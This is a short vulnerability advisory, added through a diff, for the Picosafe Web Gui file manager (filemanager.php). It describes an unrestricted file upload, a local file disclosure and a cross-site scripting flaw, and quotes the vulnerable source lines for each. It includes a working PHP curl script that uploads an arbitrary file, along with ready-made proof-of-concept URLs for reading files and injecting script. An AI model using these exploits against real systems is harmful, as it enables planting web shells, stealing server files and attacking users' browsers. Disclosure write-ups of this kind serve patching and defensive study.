@@ -1,0 +1,65 @@
+[-] Title  : Picosafe Web Gui - Multiple Vulnerabilities 
+[-] Author : Shahab Shamsi
+[-] Vendor : https://github.com/embeddedprojects/picosafe_webgui
+[-] Category : Webapps
+[-] Date : 01.October.2016
+
+
+
+Vulnerable page :
+picosafe_webgui/webinterface/js/filemanager/filemanager.php
+
+
+
+
+==========================
+|  Remote File Upload :
+==========================
+Vulnerable Source (RFU) :
+52: chmod($to, 0755); 
+48: $to = realpath($curdir) . '/' . $name; 
+40: function uploadfile($curdir)
+46: $name = $_FILES['files']['name'][0];
+
+Exploit :
+<?php
+$uploadfile="YourFileName";
+$ch = curl_init("http://localhost:8282/picosafe_webgui/webinterface/js/filemanager/filemanager.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('file'=>"@$uploadfile"));
+curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($ch);
+curl_close($ch);
+print "$result";
+?>
+
+Location :
+http://localhost:8282/picosafe_webgui/webinterface/js/filemanager/FileName
+
+
+==========================
+|  Local File Disclosure :
+==========================
+
+Vulnerable Source (LFD) :
+17: $file = base64_decode($_GET['file']);
+18: DownloadFile($file);
+111: readfile($file);
+
+POC :
+http://localhost:8282/picosafe_webgui/webinterface/js/filemanager/filemanager.php?file=base64code-Filename
+
+
+==========================
+|  Cross-Site Scripting :
+==========================
+
+Vulnerable Source (XSS) :
+8: echo json_encode($data); 
+7: $data = sortfiles($data); 
+6: $data = listdirectory($directory); 
+5: $directory = base64_decode($_GET['directory']); 
+
+POC :
+http://localhost:8282/picosafe_webgui/webinterface/js/filemanager/filemanager.php?directory=Base64-ScriptingCode
